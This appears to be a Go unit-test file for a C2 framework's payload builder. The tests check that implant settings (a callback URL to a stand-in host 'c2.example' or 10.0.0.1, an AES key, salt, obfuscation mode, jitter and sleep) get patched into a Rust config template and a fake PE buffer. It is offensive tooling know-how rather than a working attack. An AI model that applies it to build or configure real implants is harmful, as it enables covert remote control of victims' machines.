package services

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestPatchRustStrConst_OnlyConstNotComparisons(t *testing.T) {
	src := `/// note REPLACE_ME_URL in comment
pub const REMOTE_STUB: &str = "REPLACE_ME_URL";
pub fn get() {
    if REMOTE_STUB != "REPLACE_ME_URL" {
        return;
    }
}
`
	out, err := patchRustStrConst(src, "REMOTE_STUB", "REPLACE_ME_URL", "ws://c2.example/socket")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, `pub const REMOTE_STUB: &str = "ws://c2.example/socket"`) {
		t.Fatalf("const not patched:\n%s", out)
	}
	// comparison sentinel must remain so unpatched-detection logic still compiles correctly in templates
	if !strings.Contains(out, `REMOTE_STUB != "REPLACE_ME_URL"`) {
		t.Fatal("comparison literal was incorrectly patched")
	}
}

func TestEncodeObfuscationSlotFits15(t *testing.T) {
	for _, mode := range []string{"padding", "pad", "none", "base64", "junk", "http", ""} {
		enc := encodeObfuscationSlot(mode)
		if len(enc) != 15 {
			t.Fatalf("mode %q encoded len=%d want 15: %q", mode, len(enc), enc)
		}
	}
	// padding must NOT use the 16-byte OBF_MODE_PADDING form
	if strings.Contains(encodeObfuscationSlot("padding"), "PADDING") {
		t.Fatal("padding must encode as short alias that fits 15-byte slot")
	}
	// none must be explicitly patchable (not skipped)
	if !strings.Contains(encodeObfuscationSlot("none"), "NONE") {
		t.Fatal("none mode should encode OBF_MODE_NONE")
	}
}

func TestPatchPayloadObfuscationPadding(t *testing.T) {
	// Build a minimal fake PE-like buffer that only contains the markers we need.
	buf := make([]byte, 0, 512)
	buf = append(buf, []byte(ServerUrlMarker)...)
	buf = append(buf, []byte(AesKeyMarker)...)
	buf = append(buf, []byte(EncryptionSaltMarker)...)
	buf = append(buf, []byte(ObfuscationMarker)...)
	// Pad so replaceInPlace slot sizes are safe
	for len(buf) < 256 {
		buf = append(buf, 0)
	}
	key := "01234567890123456789012345678901"
	out, err := PatchPayload(buf, "ws://10.0.0.1:8443/socket", key, 10, 30, "", false, 0, "salt", "padding")
	if err != nil {
		t.Fatal(err)
	}
	s := string(out)
	if strings.Contains(s, ObfuscationMarker) {
		t.Fatal("OBF_MODE_STRICT should be overwritten for padding")
	}
	if !strings.Contains(s, "OBF_MODE_PAD") {
		t.Fatalf("expected OBF_MODE_PAD in patched blob")
	}
	// none must also overwrite
	out2, err := PatchPayload(buf, "ws://10.0.0.1:8443/socket", key, 10, 30, "", false, 0, "salt", "none")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(out2), "OBF_MODE_NONE") {
		t.Fatal("none mode must patch binary slot")
	}
}

func TestPatchConfig_FileRoundTrip(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "config.rs")
	body := `
pub const AES_KEY: &str = "REPLACE_ME_AES_KEY";
pub const REMOTE_STUB: &str = "REPLACE_ME_URL";
pub const ENCRYPTION_SALT: &str = "REPLACE_ME_SALT";
pub const OBFUSCATION_MODE: &str = "REPLACE_ME_OBF";
pub const JITTER: &str = "REPLACE_ME_JITTER";
pub const SLEEP_SECS: &str = "REPLACE_ME_SLEEP";
pub static SLEEP_TIME_TEMPLATE: [u8; 16] = *b"ST_DATA_INT_0000";
fn check() {
    if REMOTE_STUB != "REPLACE_ME_URL" {}
    if AES_KEY != "REPLACE_ME_AES_KEY" {}
}
`
	if err := os.WriteFile(path, []byte(body), 0644); err != nil {
		t.Fatal(err)
	}
	key := "0123456789ABCDEF0123456789ABCDEF" // 32 ascii
	if err := patchConfig(path, "ws://10.0.0.1:8443/socket", key, 10, 25, "", "saltsaltsaltsaltsaltsaltsalt12", "none", 30); err != nil {
		t.Fatal(err)
	}
	got, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	s := string(got)
	if !strings.Contains(s, `pub const REMOTE_STUB: &str = "ws://10.0.0.1:8443/socket"`) {
		t.Fatal("url const missing")
	}
	if !strings.Contains(s, `pub const AES_KEY: &str = "0123456789ABCDEF0123456789ABCDEF"`) {
		t.Fatal("aes const missing")
	}
	// Explicit "none" must stay none (listener alignment)
	if !strings.Contains(s, `pub const OBFUSCATION_MODE: &str = "none"`) {
		t.Fatal("obf should preserve explicit none")
	}
	if !strings.Contains(s, `pub const SLEEP_SECS: &str = "30"`) {
		t.Fatal("sleep_time should be injected as SLEEP_SECS")
	}
	if !strings.Contains(s, `*b"ST_DATA_INT_0030"`) {
		t.Fatal("SLEEP_TIME_TEMPLATE should be rewritten for binary alignment")
	}
	if !strings.Contains(s, `REMOTE_STUB != "REPLACE_ME_URL"`) {
		t.Fatal("sentinel comparison should remain")
	}
}
